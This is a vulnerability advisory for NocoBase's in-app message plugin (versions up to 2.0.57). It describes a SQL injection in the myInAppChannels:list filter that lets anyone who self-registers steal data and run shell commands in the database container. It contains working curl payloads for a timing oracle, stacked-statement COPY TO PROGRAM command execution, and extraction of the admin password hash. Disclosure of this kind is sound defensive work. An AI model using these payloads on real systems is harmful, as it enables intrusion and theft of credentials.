# NocoBase: SQL injection in /api/myInAppChannels:list filter to PG-superuser RCE

- CWE: CWE-89
- Packages: npm:@nocobase/plugin-notification-in-app-message

---

## Summary

`GET /api/myInAppChannels:list` accepts a structured `filter` query parameter. The handler for the `latestMsgReceiveTimestamp` field splices the `$lt` value directly into a `Sequelize.literal()` template string with no escape, type cast, or parameter binding. The action ACL is `loggedIn`, so any authenticated account reaches it. The default `auth-basic` authenticator ships `allowSignUp: true`, so the account is obtainable anonymously.

The injection is reachable with the URL parameter `filter[latestMsgReceiveTimestamp][$lt]=<expression>`. The `pg` driver in front of Sequelize accepts stacked statements, so the chain extends from boolean and timing oracles to multi-statement payloads.

The shipped `docker-compose.yml` creates the DB role `nocobase` on a stock `postgres:16` image, which assigns the `rolsuper` attribute by default. `COPY ... TO PROGRAM '...'` therefore runs shell commands as `uid=999(postgres)` inside the database container.

Result: any anonymous visitor signs up, signs in, and exfiltrates arbitrary rows or executes shell commands inside the database container with one HTTP GET after the sign-in.

## Affected

NocoBase server, `@nocobase/plugin-notification-in-app-message` `<=2.0.57`. Confirmed live-exploitable on the official `nocobase/nocobase:2.0.57` Docker image (HEAD `e35a2737d9df139cacecae0151c3326746e2339a`).

`@nocobase/plugin-notification-in-app-message` is enabled by default in `@nocobase/preset-nocobase`. The default `auth-basic` ships `allowSignUp: true`. The shipped `docker/app-postgres/docker-compose.yml` uses `POSTGRES_USER=nocobase` against `postgres:16`, which makes the role a PostgreSQL superuser; `COPY ... TO PROGRAM` runs from this role.

## Root cause

`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/defineMyInAppChannels.ts:62-63`: the `latestMsgReceiveTimestamp` filter is built as `Sequelize.literal(\`${latestMsgReceiveTimestampSQL} < ${filter.latestMsgReceiveTimestamp.$lt}\`)`. The `$lt` value comes straight from the GET `filter` JSON; the template uses `${...}` interpolation with no `escape()`, `replacements`, or type cast.

`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/InAppNotificationChannel.ts:200`: `app.acl.allow('myInAppChannels', '*', 'loggedIn')` exposes every action on the resource to every authenticated role, including the seeded `member`.

`packages/plugins/@nocobase/plugin-auth/src/server/plugin.ts:295`: `allowSignUp: true` ships in the default `auth-basic` seed; `POST /api/auth:signUp` returns 200 with no admin involvement.

`docker/app-postgres/docker-compose.yml:30`: `POSTGRES_USER: nocobase` against `postgres:16`. The bare `postgres:16` image creates the named role with `rolsuper=true` (live-verified: `SELECT rolsuper FROM pg_roles WHERE rolname='nocobase'` returns `true`). The `pg` driver simple-query accepts stacked statements.

## Reproduction

Tested against `nocobase/nocobase:2.0.57` from the official Docker image with the default `app-postgres` compose. Attacker is an anonymously-signed-up `member`.

1. Anonymous sign-up, then sign-in for a `member` JWT.

```
curl -X POST -H 'Content-Type: application/json' \
  -d '{"username":"a","password":"P!ssw0rd1","confirm_password":"P!ssw0rd1"}' \
  http://target:13000/api/auth:signUp?authenticator=basic
TOKEN=$(curl -sX POST -H 'Content-Type: application/json' \
  -d '{"account":"a","password":"P!ssw0rd1"}' \
  http://target:13000/api/auth:signIn?authenticator=basic | jq -r .data.token)
```

2. Time-based oracle confirms injection. Each request below takes ~5 seconds.

```
curl -sG -H "Authorization: Bearer $TOKEN" -H "X-Authenticator: basic" \
  "http://target:13000/api/myInAppChannels:list" \
  --data-urlencode "filter[latestMsgReceiveTimestamp][\$lt]=0) AND 1882=(SELECT 1882 FROM PG_SLEEP(5))-- a"
```

3. Stacked-statement `COPY ... TO PROGRAM` runs shell as `uid=999(postgres)` inside the database container.

```
curl -sG -H "Authorization: Bearer $TOKEN" -H "X-Authenticator: basic" \
  "http://target:13000/api/myInAppChannels:list" \
  --data-urlencode "filter[latestMsgReceiveTimestamp][\$lt]=0); COPY (SELECT 1) TO PROGRAM 'id > /tmp/PWN_VERIFY.txt'; --"
docker exec launch-postgres-1 cat /tmp/PWN_VERIFY.txt
# uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

Live-verified: sqlmap 1.10.3 against this endpoint reports `Type: boolean-based blind` (payload `0) AND 1511=(SELECT (CASE WHEN (1511=1511) THEN 1511 ELSE (SELECT 4568 UNION SELECT 9477) END))-- KVYH`), `Type: time-based blind`, `current user: nocobase`, `current user is DBA: True`. Admin password hash `ef6ea7f6...8ea12` exfiltrated via `COPY (SELECT email,password FROM users WHERE id=1) TO PROGRAM 'cat > /tmp/PWN_HASH.txt'`. Reproduced 2026-05-26 against HEAD `e35a2737`.

## Impact

- Authenticated SQL injection with time-based, boolean-based, and stacked-statement primitives (`pg` driver simple-query).
- Arbitrary row read of any collection, including `users.password` PBKDF2 hashes for the super-admin account.
- Shell command execution as `uid=999(postgres)` inside the PostgreSQL container via `COPY ... TO PROGRAM`.
- Anonymous reach in default deployments because `auth-basic` ships `allowSignUp: true`.

## Credit

Jan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de)
